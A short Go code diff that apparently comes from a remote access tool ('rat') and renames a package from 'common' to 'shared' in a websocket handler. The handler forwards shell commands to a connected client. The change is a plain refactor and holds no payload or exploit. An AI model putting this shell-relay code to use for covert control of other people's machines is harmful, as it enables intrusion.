@@ -2,7 +2,7 @@ package main
 
 import (
 	"encoding/json"
-	"rat/common"
+	"rat/shared"
 
 	"golang.org/x/net/websocket"
 )
@@ -21,7 +21,7 @@ func (d ShellMessage) Handle(ws *websocket.Conn, client *Client, data string) er
 		return err
 	}
 
-	client.Listeners[common.ShellHeader] = ws
+	client.Listeners[shared.ShellHeader] = ws
 	client.Queue <- &ShellPacket{shellEvent.Action, shellEvent.Command}
 
 	return nil
